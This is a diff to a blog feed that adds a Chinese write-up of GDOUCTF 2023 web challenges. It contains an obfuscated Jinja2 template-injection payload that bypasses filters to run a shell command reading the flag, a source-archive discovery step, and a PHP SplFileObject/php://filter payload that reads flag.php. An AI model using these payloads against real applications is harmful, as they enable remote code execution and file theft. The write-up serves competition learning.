@@ -62,8 +62,70 @@ ps: 听说大佬们还有很多解题方法&lt;br&gt;&lt;br&gt;
 ③用 PUT 方式输入’/super-secret-route-nobody-will-guess’返回 flag&lt;br&gt;&lt;br&gt;
 那么我们就要用 PUT 方式输入，就能得到 flag&lt;br&gt;&lt;br&gt;
 4. 直接抓包，将 GET 方法改为 PUT，成功得到 flag&lt;br&gt;&lt;br&gt;
-&lt;img src=&#34;/2023/04/17/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%AA%E4%BA%BA%E6%89%93GDOUCTF2023/EZ_WEB3.png&#34; alt&gt;&lt;/p&gt;
-&lt;p&gt;第 4 题没做出来，还是太菜了，要多学习！！！&lt;/p&gt;
+&lt;img src=&#34;/2023/04/17/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%AA%E4%BA%BA%E6%89%93GDOUCTF2023/EZ_WEB3.png&#34; alt&gt;&lt;br&gt;
+&lt;br&gt;&lt;br&gt;
+&lt;br&gt;&lt;br&gt;
+&lt;br&gt;&lt;br&gt;
+&lt;br&gt;&lt;/p&gt;
+&lt;h4&gt;ez_ze&lt;/h4&gt;
+1.直接放Myanemo大佬的payload
+&lt;br&gt;
+&lt;pre&gt;&lt;code&gt;
+name={% set po=dict(po=a,p=b)|join%}
+{% set a=(()|select|string|list)|attr(po)(24)%}
+{% set ini=(a,a,dict(in=a,it=b)|join,a,a)|join()%}
+{% set glo=(a,a,dict(glo=a,bals=b)|join,a,a)|join()%}
+{% set cls=(a,a,dict(cla=a,ss=b)|join,a,a)|join()%}
+{% set bs=(a,a,dict(bas=a,e=b)|join,a,a)|join()%}
+{% set geti=(a,a,dict(get=a)|join,dict(item=a)|join,a,a)|join()%}
+{% set subc=(a,a,dict(subcla=a,sses=b)|join,a,a)|join()%}
+{%set pp=dict(pop=a,en=b)|join %}
+{%print(()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(132)|attr(ini)|attr(glo)|attr(geti)(pp)(‘tac /flag’)|attr(‘read’)() )%}
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;br&gt;
+注意！！！payload为和之间的代码
+&lt;br&gt;
+将payload用url编码一下即可&lt;br&gt;
+注意：直接使用会报错，最后一行的(‘tac /flag’)|attr(‘read’)() )%}中的单引号 ‘’ 改成英语单引号 &#39;&#39;
+&lt;br&gt;
+&lt;br&gt;
+&lt;br&gt;
+&lt;br&gt;
+&lt;h4&gt;泄露的伪装&lt;/h4&gt;
+1.用dirsearch扫除www.rar,打开&lt;br&gt;
+&lt;p&gt;&lt;img src=&#34;/2023/04/17/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%AA%E4%BA%BA%E6%89%93GDOUCTF2023/%E6%B3%84%E9%9C%B2%E7%9A%84%E4%BC%AA%E8%A3%851.png&#34; alt&gt;&lt;br&gt;
+&lt;br&gt;&lt;br&gt;
+得到信息：&lt;br&gt;&lt;br&gt;
+&lt;img src=&#34;/2023/04/17/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%AA%E4%BA%BA%E6%89%93GDOUCTF2023/%E6%B3%84%E9%9C%B2%E7%9A%84%E4%BC%AA%E8%A3%852.png&#34; alt&gt;&lt;br&gt;
+&lt;br&gt;&lt;br&gt;
+再打开&lt;br&gt;&lt;br&gt;
+&lt;img src=&#34;/2023/04/17/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%AA%E4%BA%BA%E6%89%93GDOUCTF2023/%E6%B3%84%E9%9C%B2%E7%9A%84%E4%BC%AA%E8%A3%853.png&#34; alt&gt;&lt;br&gt;
+&lt;br&gt;&lt;br&gt;
+接下来就是代码审计了：这里直接放 payload,ctrl 是 post 提交&lt;br&gt;&lt;br&gt;
+&lt;img src=&#34;/2023/04/17/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%AA%E4%BA%BA%E6%89%93GDOUCTF2023/%E6%B3%84%E9%9C%B2%E7%9A%84%E4%BC%AA%E8%A3%854.png&#34; alt&gt;&lt;br&gt;
+&lt;br&gt;&lt;br&gt;
+&lt;br&gt;&lt;br&gt;
+&lt;br&gt;&lt;br&gt;
+&lt;br&gt;&lt;/p&gt;
+&lt;h4&gt;反方向的钟&lt;/h4&gt;
+1.这里直接放exp
+&lt;br&gt; 
+&lt;p&gt;&lt;img src=&#34;/2023/04/17/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%AA%E4%BA%BA%E6%89%93GDOUCTF2023/%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F1.png&#34; alt&gt;&lt;br&gt;
+&lt;br&gt;&lt;br&gt;
+2. 生成 payload&lt;br&gt;
+ 题中说了 flag 应该在 flag.php 中，因此我们直接用 php 的内置类 SplFileObject 来读取文件内容。由于没有输出，想要读取到文件里的内容要用伪协议。&lt;br&gt;
+POST：&lt;br&gt;
+a=SplFileObject&amp;amp;b=php://filter/read=convert.base64-encode/resource=flag.php&lt;br&gt;
+&lt;br&gt;&lt;br&gt;
+overover!!!&lt;br&gt;
+&lt;br&gt;&lt;br&gt;
+&lt;br&gt;&lt;/p&gt;
+&lt;h4&gt;总结:&lt;/h4&gt;
+这次的比赛，我的收获还是很多的，特别是解除题目的喜悦感，很难得！！！
+&lt;h4&gt;引用&lt;/h4&gt;
+&lt;br&gt;
+部分wp引用Myanemo大佬
 &lt;/font&gt; ]]></description>
         </item>
         <item>
